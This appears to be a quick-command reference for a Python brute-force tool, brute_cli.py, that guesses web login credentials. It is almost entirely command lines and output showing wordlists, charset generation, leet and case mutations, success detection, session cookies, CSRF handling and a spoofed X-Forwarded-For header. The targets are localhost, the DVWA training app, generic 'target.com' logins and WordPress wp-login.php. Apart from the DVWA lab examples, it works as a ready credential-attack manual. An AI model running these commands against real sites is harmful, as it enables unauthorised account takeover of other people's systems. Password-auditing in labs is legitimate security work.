# Brute Force CLI - Quick Commands

## Basic Usage

```bash
# Simple attack with direct list
python brute_cli.py --url "http://localhost/login" \
  --usernames admin user test \
  --passwords password 123456 admin

# With file
python brute_cli.py --url "http://target.com/login" \
  --username-file users.txt \
  --password-file passwords.txt

# Using request file (Burp format)
python brute_cli.py --request-file login.req \
  --usernames admin \
  --passwords password 123456
```

## Character Set Generation

```bash
# Generate 4-digit PINs (0000-9999)
python brute_cli.py --url "http://localhost/login" \
  --usernames user \
  --password-charset digits \
  --password-min-length 4 \
  --password-max-length 4

# Generate 3-character lowercase
python brute_cli.py --url "http://localhost/login" \
  --usernames user \
  --password-charset lower \
  --password-min-length 3 \
  --password-max-length 3 \
  --password-limit 100

# Generate alphanumeric (limited)
python brute_cli.py --url "http://localhost/login" \
  --usernames admin \
  --password-charset alphanumeric \
  --password-min-length 2 \
  --password-max-length 3 \
  --password-limit 500
```

## Charsets Available

```
digits          0-9
lower           a-z
upper           A-Z
letters         a-zA-Z
alphanumeric    a-zA-Z0-9
special         !@#$%^&*()_+-=...
all             alphanumeric + special
```

## Mutations

```bash
# Case mutations: password → PASSWORD, Password, pASSWORD
python brute_cli.py --url "http://localhost/login" \
  --usernames admin \
  --passwords password \
  --case-mutations

# Leet mutations: password → p4ssword, p@ssword
python brute_cli.py --url "http://localhost/login" \
  --usernames admin \
  --passwords password \
  --leet-mutations

# Number suffix: password → password1, password123, password!
python brute_cli.py --url "http://localhost/login" \
  --usernames admin \
  --passwords password \
  --number-suffix 1 123 2024 '!'

# Combined
python brute_cli.py --url "http://localhost/login" \
  --usernames admin \
  --passwords password pass secret \
  --case-mutations \
  --leet-mutations \
  --number-suffix 1 2024
```

## Prefix/Suffix

```bash
# Add prefix to all passwords: company_password, company_admin
python brute_cli.py --url "http://target.com/login" \
  --usernames admin \
  --passwords password admin \
  --password-prefix "company_"

# Add suffix: password2024, admin2024
python brute_cli.py --url "http://target.com/login" \
  --usernames admin \
  --passwords password admin \
  --password-suffix "2024"

# Both: company_password2024
python brute_cli.py --url "http://target.com/login" \
  --usernames admin \
  --passwords password \
  --password-prefix "company_" \
  --password-suffix "2024"
```

## Detection Methods

```bash
# Look for success string in response
python brute_cli.py --url "http://localhost/login" \
  --usernames admin \
  --passwords password 123456 \
  --success-string "Welcome back"

# Look for failure string NOT in response
python brute_cli.py --url "http://localhost/login" \
  --usernames admin \
  --passwords password 123456 \
  --failure-string "Invalid credentials"

# By HTTP status code
python brute_cli.py --url "http://localhost/login" \
  --usernames admin \
  --passwords password 123456 \
  --success-code 302 200

# Failure codes
python brute_cli.py --url "http://localhost/login" \
  --usernames admin \
  --passwords password 123456 \
  --failure-code 401 403
```

## DVWA Examples

```bash
# Low security (no protection)
python brute_cli.py --url "http://localhost/vulnerabilities/brute/" \
  --usernames admin \
  --passwords password admin 123456 \
  --cookie "PHPSESSID=abc123; security=low"

# Medium security (2-second delay)
python brute_cli.py --url "http://localhost/vulnerabilities/brute/" \
  --usernames admin \
  --passwords password admin \
  --cookie "PHPSESSID=abc123; security=medium" \
  --delay 0.1

# High security (CSRF tokens - auto-handled)
python brute_cli.py --url "http://localhost/vulnerabilities/brute/" \
  --usernames admin \
  --passwords password admin \
  --cookie "PHPSESSID=abc123; security=high"
```

## Logging & Output

```bash
# Save to JSON with verbose logging
python brute_cli.py --url "http://localhost/login" \
  --usernames admin \
  --passwords password \
  --log-file attack.json \
  --log-format json \
  --verbosity 2

# Save to CSV for spreadsheet
python brute_cli.py --url "http://localhost/login" \
  --usernames admin \
  --passwords password \
  --log-file results.csv \
  --log-format csv

# Quiet mode (only show found credentials)
python brute_cli.py --url "http://localhost/login" \
  --usernames admin \
  --passwords password \
  --verbosity 0

# Output summary JSON
python brute_cli.py --url "http://localhost/login" \
  --usernames admin \
  --passwords password \
  --output results.json
```

## Advanced Requests

```bash
# POST request
python brute_cli.py --url "http://localhost/login" \
  --usernames admin \
  --passwords password \
  --method POST

# Custom parameter names (WordPress)
python brute_cli.py --url "http://target.com/wp-login.php" \
  --usernames admin \
  --passwords password \
  --username-param "log" \
  --password-param "pwd" \
  --method POST

# Custom headers
python brute_cli.py --url "http://target.com/login" \
  --usernames admin \
  --passwords password \
  --header "X-Forwarded-For: 127.0.0.1" \
  --header "User-Agent: CustomBot"

# POST with template data
python brute_cli.py --url "http://target.com/login" \
  --usernames admin \
  --passwords password \
  --method POST \
  --data "email={username}&password={password}&remember=on"
```

## Rate Limiting

```bash
# Add delay between requests
python brute_cli.py --url "http://target.com/login" \
  --usernames admin \
  --passwords password \
  --delay 0.5     # 0.5 second between requests

# Set timeout
python brute_cli.py --url "http://target.com/login" \
  --usernames admin \
  --passwords password \
  --timeout 15    # 15 second timeout per request

# Max runtime
python brute_cli.py --url "http://target.com/login" \
  --usernames admin \
  --passwords password \
  --max-runtime 300  # Stop after 5 minutes
```

## Multiple Attempts

```bash
# Find all credentials (not just first)
python brute_cli.py --url "http://localhost/login" \
  --usernames admin user \
  --passwords password admin \
  --find-all

# Stop on first success (default)
python brute_cli.py --url "http://localhost/login" \
  --usernames admin user \
  --passwords password admin \
  --stop-on-success
```

## Complete Examples

```bash
# Full attack with mutations and logging
python brute_cli.py --url "http://localhost/vulnerabilities/brute/" \
  --usernames admin \
  --passwords password admin letmein \
  --case-mutations \
  --number-suffix 1 123 2024 \
  --cookie "PHPSESSID=abc123; security=low" \
  --verbosity 2 \
  --log-file attack.json \
  --output results.json \
  --progress-interval 10

# Charset generation with large space
python brute_cli.py --url "http://localhost/login" \
  --usernames user \
  --password-charset alphanumeric \
  --password-min-length 3 \
  --password-max-length 4 \
  --password-limit 1000 \
  --delay 0.2 \
  --verbosity 1

# Find all weak credentials
python brute_cli.py --url "http://target.com/login" \
  --username-file common-users.txt \
  --password-file common-passwords.txt \
  --find-all \
  --log-file detailed_results.csv \
  --log-format csv \
  --verbosity 2
```

## Verbosity Levels

```
0 = QUIET    Only show found credentials
1 = NORMAL   Show progress and found credentials (default)
2 = VERBOSE  Show all attempts
3 = DEBUG    Show everything including errors
```

## Output Files

**JSON format (--log-file attack.json):**
```json
{
  "stats": {
    "total_attempts": 100,
    "successful": 1,
    "failed": 99,
    "errors": 0,
    "duration_seconds": 45.23,
    "rate_per_second": 2.21
  },
  "attempts": [
    {
      "timestamp": "2024-01-15T10:30:01",
      "username": "admin",
      "password": "password",
      "status_code": 200,
      "response_time_ms": 156.32,
      "content_length": 4523,
      "success": true,
      "error": null
    }
  ]
}
```

**CSV format (--log-file results.csv):**
```
timestamp,username,password,status_code,response_time_ms,content_length,success,error
2024-01-15T10:30:01,admin,password,200,156.32,4523,True,
```

**Results JSON (--output results.json):**
```json
{
  "status": "success",
  "credentials_found": [
    {"username": "admin", "password": "password"}
  ],
  "stats": {
    "total_attempts": 100,
    "duration_seconds": 45.23,
    "rate_per_second": 2.21
  }
}
```
